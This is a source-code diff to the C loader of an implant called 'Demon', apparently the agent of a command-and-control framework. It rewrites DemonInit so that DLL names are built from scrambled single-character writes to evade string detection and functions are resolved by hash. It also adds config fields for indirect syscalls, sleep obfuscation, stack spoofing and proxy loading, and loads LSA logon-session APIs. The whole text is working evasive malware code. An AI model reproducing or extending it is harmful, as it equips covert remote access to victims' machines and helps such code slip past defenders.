@@ -256,8 +256,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
 VOID DemonInit( VOID )
 {
-    // Variables
-    CHAR                         ModuleName[ 20 ] = { 0 };
+    CHAR                         ModuleName[ 24 ] = { 0 }; /* NOTE: all module names need to be upper case: MODULE.DLL */
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
     SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };
 
@@ -291,6 +290,7 @@ VOID DemonInit( VOID )
         Instance.Win32.RtlGetVersion                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLGETVERSION );
         Instance.Win32.RtlCreateTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMERQUEUE );
         Instance.Win32.RtlCreateTimer                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMER );
+        Instance.Win32.RtlQueueWorkItem                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLQUEUEWORKITEM );
         Instance.Win32.RtlRegisterWait                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREGISTERWAIT );
         Instance.Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
         Instance.Win32.RtlCaptureContext                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
@@ -367,6 +367,7 @@ VOID DemonInit( VOID )
 
     /* load kernel32.dll functions */
     if ( ( Instance.Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
+        Instance.Win32.LoadLibraryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOADLIBRARYW );
         Instance.Win32.VirtualProtectEx                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
         Instance.Win32.VirtualProtect                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
         Instance.Win32.LocalAlloc                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALALLOC );
@@ -429,168 +430,278 @@ VOID DemonInit( VOID )
         Instance.Win32.DuplicateHandle                 = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DUPLICATEHANDLE );
     }
 
-    ModuleName[ 0 ] = 'A';
-    ModuleName[ 2 ] = 'V';
-    ModuleName[ 3 ] = 'A';
-    ModuleName[ 1 ] = 'D';
-    ModuleName[ 8 ] = 0;
-    ModuleName[ 6 ] = '3';
-    ModuleName[ 7 ] = '2';
-    ModuleName[ 5 ] = 'I';
-    ModuleName[ 4 ] = 'P';
-    Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName );
+    /* now that we loaded some of the basic apis lets parse the config and see how we load the rest */
+    /* Parse config */
+    DemonConfig();
 
-    ModuleName[ 0 ] = 'C';
-    ModuleName[ 3 ] = 'P';
-    ModuleName[ 5 ] = '3';
-    ModuleName[ 7 ] = 0;
-    ModuleName[ 2 ] = 'Y';
-    ModuleName[ 4 ] = 'T';
-    ModuleName[ 1 ] = 'R';
-    ModuleName[ 6 ] = '2';
-    Instance.Modules.Crypt32  = LdrModuleLoad( ModuleName );
+    /* now do post init stuff after parsing the config */
+    if ( Instance.Config.Implant.SysIndirect )
+    {
+        /* Initialize indirect syscalls + get SSN from every single syscall we need */
+        if  ( ! SysInitialize( Instance.Modules.Ntdll ) ) {
+            PUTS( "Failed to Initialize syscalls" )
+            /* NOTE: the agent is going to keep going for now. */
+        }
+    }
 
-    ModuleName[ 1 ] = 'S';
-    ModuleName[ 2 ] = 'C';
-    ModuleName[ 0 ] = 'M';
-    ModuleName[ 7 ] = 0;
-    ModuleName[ 3 ] = 'o';
-    ModuleName[ 5 ] = 'E';
-    ModuleName[ 6 ] = 'E';
-    ModuleName[ 4 ] = 'r';
-    Instance.Modules.Mscoree  = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'A';
+    ModuleName[ 2  ] = 'V';
+    ModuleName[ 11 ] = 'L';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 3  ] = 'A';
+    ModuleName[ 8  ] = '.';
+    ModuleName[ 12 ] = 0;
+    ModuleName[ 6  ] = '3';
+    ModuleName[ 7  ] = '2';
+    ModuleName[ 1  ] = 'D';
+    ModuleName[ 9  ] = 'D';
+    ModuleName[ 5  ] = 'I';
+    ModuleName[ 4  ] = 'P';
+    if ( ! ( Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Advapi32" )
+        return;
+    }
 
-    ModuleName[ 3 ] = 'A';
-    ModuleName[ 2 ] = 'e';
-    ModuleName[ 0 ] = 'O';
-    ModuleName[ 1 ] = 'l';
-    ModuleName[ 5 ] = 't';
-    ModuleName[ 7 ] = '2';
-    ModuleName[ 6 ] = '3';
-    ModuleName[ 4 ] = 'u';
-    ModuleName[ 8 ] = 0;
-    Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'C';
+    ModuleName[ 3  ] = 'P';
+    ModuleName[ 5  ] = '3';
+    ModuleName[ 7  ] = '.';
+    ModuleName[ 2  ] = 'Y';
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 8  ] = 'D';
+    ModuleName[ 11 ] = 0;
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 4  ] = 'T';
+    ModuleName[ 1  ] = 'R';
+    ModuleName[ 6  ] = '2';
+    if ( ! ( Instance.Modules.Crypt32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Crypt32" )
+        return;
+    }
 
-    ModuleName[ 1 ] = 's';
-    ModuleName[ 0 ] = 'U';
-    ModuleName[ 6 ] = 0;
-    ModuleName[ 5 ] = '2';
-    ModuleName[ 3 ] = 'r';
-    ModuleName[ 2 ] = 'e';
-    ModuleName[ 4 ] = '3';
-    Instance.Modules.User32 = LdrModuleLoad( ModuleName );
+    ModuleName[ 1  ] = 'S';
+    ModuleName[ 2  ] = 'C';
+    ModuleName[ 11 ] = 0;
+    ModuleName[ 0  ] = 'M';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 8  ] = 'D';
+    ModuleName[ 7  ] = '.';
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 5  ] = 'E';
+    ModuleName[ 4  ] = 'R';
+    ModuleName[ 6  ] = 'E';
+    ModuleName[ 3  ] = 'O';
+    if ( ! ( Instance.Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Mscoree" )
+        return;
+    }
 
-    ModuleName[ 0 ] = 'S';
-    ModuleName[ 7 ] = 0;
-    ModuleName[ 6 ] = '2';
-    ModuleName[ 4 ] = 'l';
-    ModuleName[ 1 ] = 'h';
-    ModuleName[ 5 ] = '3';
-    ModuleName[ 3 ] = 'l';
-    ModuleName[ 2 ] = 'e';
-    Instance.Modules.Shell32   = LdrModuleLoad( ModuleName );
+    ModuleName[ 3  ] = 'A';
+    ModuleName[ 2  ] = 'E';
+    ModuleName[ 0  ] = 'O';
+    ModuleName[ 1  ] = 'L';
+    ModuleName[ 5  ] = 'T';
+    ModuleName[ 11 ] = 'L';
+    ModuleName[ 7  ] = '2';
+    ModuleName[ 6  ] = '3';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 12 ] = 0;
+    ModuleName[ 4  ] = 'U';
+    ModuleName[ 9  ] = 'D';
+    ModuleName[ 8  ] = '.';
+    if ( ! ( Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Oleaut32" )
+        return;
+    }
 
-    ModuleName[ 0 ] = 'm';
-    ModuleName[ 6 ] = 0;
-    ModuleName[ 4 ] = 'r';
-    ModuleName[ 2 ] = 'v';
-    ModuleName[ 3 ] = 'c';
-    ModuleName[ 5 ] = 't';
-    ModuleName[ 1 ] = 's';
-    Instance.Modules.Msvcrt  = LdrModuleLoad( ModuleName );
-
-    ModuleName[ 0 ]  = 'k';
+    ModuleName[ 1  ] = 'S';
+    ModuleName[ 0  ] = 'U';
     ModuleName[ 10 ] = 0;
-    ModuleName[ 1 ]  = 'e';
-    ModuleName[ 2 ]  = 'r';
-    ModuleName[ 4 ]  = 'e';
-    ModuleName[ 3 ]  = 'n';
-    ModuleName[ 6 ]  = 'b';
-    ModuleName[ 8 ]  = 's';
-    ModuleName[ 9 ]  = 'e';
-    ModuleName[ 5 ]  = 'l';
-    ModuleName[ 7 ]  = 'a';
-    Instance.Modules.KernelBase = LdrModuleLoad( ModuleName );
+    ModuleName[ 6  ] = '.';
+    ModuleName[ 8  ] = 'L';
+    ModuleName[ 7  ] = 'D';
+    ModuleName[ 5  ] = '2';
+    ModuleName[ 3  ] = 'R';
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 2  ] = 'E';
+    ModuleName[ 4  ] = '3';
+    if ( ! ( Instance.Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load User32" )
+        return;
+    }
 
-    ModuleName[ 0 ] = 'c';
-    ModuleName[ 1 ] = 'r';
-    ModuleName[ 2 ] = 'y';
-    ModuleName[ 3 ] = 'p';
-    ModuleName[ 4 ] = 't';
-    ModuleName[ 5 ] = 's';
-    ModuleName[ 6 ] = 'p';
-    ModuleName[ 7 ] = 0;
-    Instance.Modules.CryptSp = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'S';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 7  ] = '.';
+    ModuleName[ 6  ] = '2';
+    ModuleName[ 8  ] = 'D';
+    ModuleName[ 4  ] = 'L';
+    ModuleName[ 1  ] = 'H';
+    ModuleName[ 11 ] = 0;
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 5  ] = '3';
+    ModuleName[ 3  ] = 'L';
+    ModuleName[ 2  ] = 'E';
+    if ( ! ( Instance.Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Shell32" )
+        return;
+    }
+
+    ModuleName[ 0  ] = 'M';
+    ModuleName[ 6  ] = '.';
+    ModuleName[ 10 ] = 0;
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 4  ] = 'R';
+    ModuleName[ 2  ] = 'V';
+    ModuleName[ 8  ] = 'L';
+    ModuleName[ 7  ] = 'D';
+    ModuleName[ 3  ] = 'C';
+    ModuleName[ 5  ] = 'T';
+    ModuleName[ 1  ] = 'S';
+    if ( ! ( Instance.Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Msvcrt" )
+        return;
+    }
+
+    ModuleName[ 0  ] = 'K';
+    ModuleName[ 10 ] = '.';
+    ModuleName[ 13 ] = 'L';
+    ModuleName[ 14 ] = 0;
+    ModuleName[ 11 ] = 'D';
+    ModuleName[ 1  ] = 'E';
+    ModuleName[ 2  ] = 'R';
+    ModuleName[ 4  ] = 'E';
+    ModuleName[ 3  ] = 'N';
+    ModuleName[ 12 ] = 'L';
+    ModuleName[ 6  ] = 'B';
+    ModuleName[ 8  ] = 'S';
+    ModuleName[ 9  ] = 'E';
+    ModuleName[ 5  ] = 'L';
+    ModuleName[ 7  ] = 'A';
+    if ( ! ( Instance.Modules.KernelBase = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load KernelBase" )
+        return;
+    }
+
+    ModuleName[ 2  ] = 'Y';
+    ModuleName[ 3  ] = 'P';
+    ModuleName[ 8  ] = 'D';
+    ModuleName[ 7  ] = '.';
+    ModuleName[ 11 ] = 0;
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 1  ] = 'R';
+    ModuleName[ 5  ] = 'S';
+    ModuleName[ 0  ] = 'C';
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 6  ] = 'P';
+    ModuleName[ 4  ] = 'T';
+    if ( ! ( Instance.Modules.CryptSp = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load KernelBase" )
+        return;
+    }
 
 #ifdef TRANSPORT_HTTP
-    ModuleName[ 0 ] = 'w';
-    ModuleName[ 2 ] = 'n';
-    ModuleName[ 7 ] = 0;
-    ModuleName[ 4 ] = 't';
-    ModuleName[ 1 ] = 'i';
-    ModuleName[ 6 ] = 'p';
-    ModuleName[ 3 ] = 'h';
-    ModuleName[ 5 ] = 't';
-    Instance.Modules.WinHttp = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'W';
+    ModuleName[ 2  ] = 'N';
+    ModuleName[ 7  ] = '.';
+    ModuleName[ 11 ] = 0;
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 4  ] = 'T';
+    ModuleName[ 8  ] = 'D';
+    ModuleName[ 1  ] = 'I';
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 6  ] = 'P';
+    ModuleName[ 3  ] = 'H';
+    ModuleName[ 5  ] = 'T';
+    if ( ! ( Instance.Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load WinHttp" )
+        return;
+    }
 #endif
 
-    ModuleName[ 0 ] = 'i';
-    ModuleName[ 8 ] = 0;
-    ModuleName[ 2 ] = 'h';
-    ModuleName[ 6 ] = 'p';
-    ModuleName[ 1 ] = 'p';
-    ModuleName[ 3 ] = 'l';
-    ModuleName[ 5 ] = 'a';
-    ModuleName[ 4 ] = 'p';
-    ModuleName[ 7 ] = 'i';
-    Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName );
+    ModuleName[ 8  ] = '.';
+    ModuleName[ 0  ] = 'I';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 2  ] = 'H';
+    ModuleName[ 9  ] = 'D';
+    ModuleName[ 6  ] = 'P';
+    ModuleName[ 11 ] = 'L';
+    ModuleName[ 1  ] = 'P';
+    ModuleName[ 3  ] = 'L';
+    ModuleName[ 12 ] = 0;
+    ModuleName[ 5  ] = 'A';
+    ModuleName[ 4  ] = 'P';
+    ModuleName[ 7  ] = 'I';
+    if ( ! ( Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Iphlpapi" )
+        return;
+    }
 
     ModuleName[ 4 ] = '2';
-    ModuleName[ 5 ] = 0;
-    ModuleName[ 2 ] = 'i';
-    ModuleName[ 1 ] = 'd';
-    ModuleName[ 0 ] = 'g';
+    ModuleName[ 6 ] = 'D';
+    ModuleName[ 5 ] = '.';
+    ModuleName[ 8 ] = 'L';
+    ModuleName[ 2 ] = 'I';
+    ModuleName[ 1 ] = 'D';
+    ModuleName[ 7 ] = 'L';
+    ModuleName[ 9 ] = 0;
+    ModuleName[ 0 ] = 'G';
     ModuleName[ 3 ] = '3';
-    Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName );
+    if ( ! ( Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Gdi32" )
+        return;
+    }
 
-    ModuleName[ 0 ] = 'w';
-    ModuleName[ 4 ] = 'l';
-    ModuleName[ 1 ] = 'k';
-    ModuleName[ 6 ] = 0;
-    ModuleName[ 2 ] = 's';
-    ModuleName[ 3 ] = 'c';
-    ModuleName[ 5 ] = 'i';
-    Instance.Modules.Wkscli = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'N';
+    ModuleName[ 11 ] = 'L';
+    ModuleName[ 8  ] = '.';
+    ModuleName[ 9  ] = 'D';
+    ModuleName[ 6  ] = '3';
+    ModuleName[ 2  ] = 'T';
+    ModuleName[ 3  ] = 'A';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 12 ] = 0;
+    ModuleName[ 4  ] = 'P';
+    ModuleName[ 5  ] = 'I';
+    ModuleName[ 1  ] = 'E';
+    ModuleName[ 7  ] = '2';
+    if ( ! ( Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load NetApi32" )
+        return;
+    }
 
-    ModuleName[ 0 ] = 'N';
-    ModuleName[ 8 ] = 0;
-    ModuleName[ 6 ] = '3';
-    ModuleName[ 2 ] = 't';
-    ModuleName[ 3 ] = 'A';
-    ModuleName[ 4 ] = 'p';
-    ModuleName[ 5 ] = 'i';
-    ModuleName[ 1 ] = 'e';
-    ModuleName[ 7 ] = '2';
-    Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'W';
+    ModuleName[ 2  ] = '2';
+    ModuleName[ 4  ] = '3';
+    ModuleName[ 6  ] = '.';
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 1  ] = 'S';
+    ModuleName[ 3  ] = '_';
+    ModuleName[ 5  ] = '2';
+    ModuleName[ 10 ] = 0;
+    ModuleName[ 8  ] = 'L';
+    ModuleName[ 7  ] = 'D';
+    if ( ! ( Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Ws2_32" )
+        return;
+    }
 
-    ModuleName[ 0 ] = 'W';
-    ModuleName[ 1 ] = 's';
-    ModuleName[ 2 ] = '2';
-    ModuleName[ 3 ] = '_';
-    ModuleName[ 4 ] = '3';
-    ModuleName[ 5 ] = '2';
-    ModuleName[ 6 ] = 0;
-    Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName );
-
-    ModuleName[ 0 ] = 's';
-    ModuleName[ 7 ] = 0;
-    ModuleName[ 1 ] = 's';
-    ModuleName[ 6 ] = 'i';
-    ModuleName[ 5 ] = 'l';
-    ModuleName[ 2 ] = 'p';
-    ModuleName[ 4 ] = 'c';
-    ModuleName[ 3 ] = 'i';
-    Instance.Modules.Sspicli = LdrModuleLoad( ModuleName );
+    ModuleName[ 0  ] = 'S';
+    ModuleName[ 11 ] = 0;
+    ModuleName[ 9  ] = 'L';
+    ModuleName[ 1  ] = 'S';
+    ModuleName[ 6  ] = 'I';
+    ModuleName[ 7  ] = '.';
+    ModuleName[ 5  ] = 'L';
+    ModuleName[ 8  ] = 'D';
+    ModuleName[ 2  ] = 'P';
+    ModuleName[ 10 ] = 'L';
+    ModuleName[ 4  ] = 'C';
+    ModuleName[ 3  ] = 'I';
+    if ( ! ( Instance.Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
+        PUTS( "Failed to load Sspicli" )
+        return;
+    }
 
     /* zero out the module name from the stack */
     MemZero( ModuleName, sizeof( ModuleName ) );
@@ -708,11 +819,15 @@ VOID DemonInit( VOID )
     /* load mscoree.dll functions */
     if ( Instance.Modules.Mscoree ) {
         Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );
+
+        PUTS( "Loaded Mscoree functions" )
     }
 
     /* load Iphlpapi.dll functions */
     if ( Instance.Modules.Iphlpapi ) {
         Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
+
+        PUTS( "Loaded Iphlpapi functions" )
     }
 
     /* load netApi32.dll functions */
@@ -758,19 +873,8 @@ VOID DemonInit( VOID )
         Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
         Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
         Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );
-    }
 
-    /* Parse config */
-    DemonConfig();
-
-    /* now do post init stuff after parsing the config */
-    if ( Instance.Config.Implant.SysIndirect )
-    {
-        /* Initialize indirect syscalls + get SSN from every single syscall we need */
-        if  ( ! SysInitialize( Instance.Modules.Ntdll ) ) {
-            PUTS( "Failed to Initialize syscalls" )
-            /* NOTE: the agent is going to keep going for now. */
-        }
+        PUTS( "Loaded Sspicli functions" )
     }
 
     /* query current processor architecture */
@@ -852,11 +956,11 @@ VOID DemonConfig()
     Instance.Config.Memory.Execute = ParserGetInt32( &Parser );
 
     PRINTF(
-        "[CONFIG] Memory: \n"
-        " - Allocate: %d  \n"
-        " - Execute : %d  \n",
-        Instance.Config.Memory.Alloc,
-        Instance.Config.Memory.Execute
+            "[CONFIG] Memory: \n"
+            " - Allocate: %d  \n"
+            " - Execute : %d  \n",
+            Instance.Config.Memory.Alloc,
+            Instance.Config.Memory.Execute
     )
 
     Buffer = ParserGetBytes( &Parser, &Length );
@@ -868,31 +972,30 @@ VOID DemonConfig()
     MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );
 
     PRINTF(
-        "[CONFIG] Spawn: \n"
-        " - [x64] => %ls  \n"
-        " - [x86] => %ls  \n",
-        Instance.Config.Process.Spawn64,
-        Instance.Config.Process.Spawn86
+            "[CONFIG] Spawn: \n"
+            " - [x64] => %ls  \n"
+            " - [x86] => %ls  \n",
+            Instance.Config.Process.Spawn64,
+            Instance.Config.Process.Spawn86
     )
 
     Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
     Instance.Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
+    Instance.Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
     Instance.Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
     Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */
 
     PRINTF(
-        "[CONFIG] Sleep Obfuscation: \n"
-        " - Technique: %d \n"
-        " - Stack Dup: %s \n"
-        "[CONFIG] SysIndirect: %s\n",
-        Instance.Config.Implant.SleepMaskTechnique,
-        Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE",
-        Instance.Config.Implant.SysIndirect ? "TRUE" : "FALSE"
+            "[CONFIG] Sleep Obfuscation: \n"
+            " - Technique: %d \n"
+            " - Stack Dup: %s \n"
+            "[CONFIG] ProxyLoading: %d\n"
+            "[CONFIG] SysIndirect : %s\n",
+            Instance.Config.Implant.SleepMaskTechnique,
+            Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE",
+            Instance.Config.Implant.ProxyLoading,
+            Instance.Config.Implant.SysIndirect ? "TRUE" : "FALSE"
     )
-
-#if _M_IX86
-    PRINTF("Is WoW64: %s\n", IsWoW64() ? "TRUE" : "FALSE")
-#endif
 
 #ifdef TRANSPORT_HTTP
     Instance.Config.Transport.KillDate       = ParserGetInt64( &Parser );
